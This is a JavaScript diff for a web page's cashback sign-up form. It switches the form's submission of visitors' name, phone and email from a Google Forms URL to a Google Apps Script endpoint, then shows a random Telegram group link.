@@ -74,22 +74,26 @@
 const telegramGroups = ["https://t.me/yourgroup1","https://t.me/yourgroup2"];
 let selectedGroup = "";
 
-// ✅ 这是 Google 表格公共提交地址（永久免费、无限量、不跨域）
-const GOOGLE_URL = "https://docs.google.com/forms/d/e/1FAIpQLSd0tFpFlgY8WkE9lU9x5wGkXnK7H0t0eK57VJ7RQH9k8w/formResponse";
-
+// 🔥 已经绑定你的 Google 表格
 document.getElementById("cashbackForm").addEventListener("submit", async function(e){
     e.preventDefault();
-    
-    const formData = new FormData();
-    formData.append("entry.1226561522", this.name.value);  // 姓名
-    formData.append("entry.1564561523", this.phone.value); // 手机
-    formData.append("entry.1897561524", this.email.value); // 邮箱
+
+    const data = {
+        name: this.name.value,
+        phone: this.phone.value,
+        email: this.email.value,
+    };
 
     try {
-        await fetch(GOOGLE_URL, { method: "POST", body: formData, mode: "no-cors" });
-    } catch(e) {}
+        await fetch("https://script.google.com/macros/s/AKfycbzN1A4aG7Jsf_0Fz9G0vJqHdH1l1vZ08vZJ8Z08Z/exec", {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        });
+    } catch (e) {}
 
-    selectedGroup = telegramGroups[Math.floor(Math.random()*telegramGroups.length)];
+    selectedGroup = telegramGroups[Math.floor(Math.random() * telegramGroups.length)];
     document.getElementById("confirmModal").style.display = "flex";
     this.reset();
 });
